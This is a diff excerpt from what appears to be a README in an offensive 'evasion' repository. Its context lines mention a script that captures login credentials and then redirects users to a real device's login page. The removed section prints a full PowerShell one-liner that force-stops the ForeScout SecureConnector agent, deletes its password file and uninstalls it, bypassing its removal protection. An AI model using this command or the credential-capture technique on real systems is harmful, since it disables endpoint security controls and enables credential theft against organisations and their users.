@@ -280,11 +280,3 @@ The user is redirected to a real device's login page.<br />
 The script prints the captured credentials then waits for other login attempts.<br />
 ![alt text](https://github.com/billchaison/evasion/blob/master/wc05.png)
 
-## >> Uninstalling ForeScout Secure Connector (Password Bypass)
-
-On Windows, the ForeScout Secure Connector may be protected from removal with a password specified under `C:\Program Files\ForeScout SecureConnector\SecureConnectorPassword.ini`.  Launch an elevated Powershell with administrative privileges and execute the following one-liner to delete the password file and uninstall the product.
-
-```powershell
-Stop-Process -Name "SecureConnector" -Force; while($true) { try { Remove-Item 'C:\Program Files\ForeScout SecureConnector\SecureConnectorPassword.ini' -ErrorAction 'stop'; break; } catch { } }; Start-Process c:\Windows\System32\rundll32.exe 'shell32.dll,ShellExec_RunDLL "C:\Program Files\ForeScout SecureConnector\SecureConnector.exe" -uninstall'
-```
-
